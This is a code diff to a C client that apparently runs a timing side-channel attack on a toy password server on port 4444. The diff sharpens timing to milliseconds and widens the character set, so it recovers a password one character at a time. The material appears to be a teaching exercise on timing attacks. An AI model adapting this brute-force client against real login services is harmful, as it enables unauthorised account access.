@@ -8,8 +8,17 @@
 #include <arpa/inet.h>
 #include <stdbool.h>
 #include <time.h>
+#include <sys/time.h>
+#include <inttypes.h>
 
 #define PORT 4444
+
+long long timeInMilliseconds(void) {
+    struct timeval tv;
+
+    gettimeofday(&tv, NULL);
+    return tv.tv_sec*1000LL+tv.tv_usec/1000;
+}
 
 void discoverPassword(int clientSocket, char* username) {
 
@@ -18,19 +27,19 @@ void discoverPassword(int clientSocket, char* username) {
     char server_buffer[1024];
 
     char maxTimeChar;
-    char currChar = 65;
-    time_t maxTime = 0;
-    time_t timeBefore, timeAfter;
+    char currChar = 33;
+    long long maxTime = 0;
+    long long timeBefore, timeAfter;
 
     //Perform the timing attack to discover the password
-    for(int i=0; i<1024; i++) {
+    for(long long i=0; i<95232; i++) {
         send(clientSocket, username, strlen(username), 0);
         sleep(0.10);
 
         strcpy(password_buffer, rightPassword);
         password_buffer[strlen(password_buffer)] = currChar;
 
-        timeBefore = time(NULL);
+        timeBefore = timeInMilliseconds();
 
         send(clientSocket, password_buffer, strlen(password_buffer), 0);
 
@@ -39,9 +48,10 @@ void discoverPassword(int clientSocket, char* username) {
             exit(1);
         }
 
-        timeAfter = time(NULL);
+        timeAfter = timeInMilliseconds();
 
         if(strcmp(server_buffer, "Authenticated") == 0) {   // The right password found
+            strcpy(rightPassword, password_buffer);
             break;  
         }
         
@@ -50,10 +60,9 @@ void discoverPassword(int clientSocket, char* username) {
             maxTimeChar = currChar;
         }
 
-        // Move to the next char
         currChar++;
-        if(currChar > 122) {
-            currChar = 65;
+        if(currChar > 126) {
+            currChar = 33;
             rightPassword[strlen(rightPassword)] = maxTimeChar;
         }
 
@@ -61,6 +70,9 @@ void discoverPassword(int clientSocket, char* username) {
     }
 
     printf("Success! The password is: %s\n\n", rightPassword);
+
+    bzero(rightPassword, sizeof(rightPassword));
+    bzero(password_buffer, sizeof(password_buffer));
 }
 
 void chatWithServer(int clientSocket) {
@@ -78,7 +90,7 @@ void chatWithServer(int clientSocket) {
         }
         
         discoverPassword(clientSocket, username_buffer);
-
+        
         bzero(username_buffer, sizeof(username_buffer));
     }
 }
